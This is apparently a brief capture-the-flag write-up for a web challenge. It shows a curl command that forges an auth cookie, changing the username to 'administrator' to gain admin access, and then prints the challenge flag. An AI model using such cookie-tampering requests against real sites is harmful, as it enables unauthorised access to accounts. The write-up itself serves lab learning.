Go to the site and log in; you'll get a cookie set such as:

    username=guest&date=2017-01-28T17:12:33-0800&secret_length=8&

All you have to do is change the username:

curl 'http://x.x.x.x/index.php' -H 'Cookie: auth=username%3Dadministrator%26date%3D2017-02-02T03%3A41%3A45%2B0000%26'

Flag is HTU{0076ecde2daae415d7e5ccc7db909e7e}
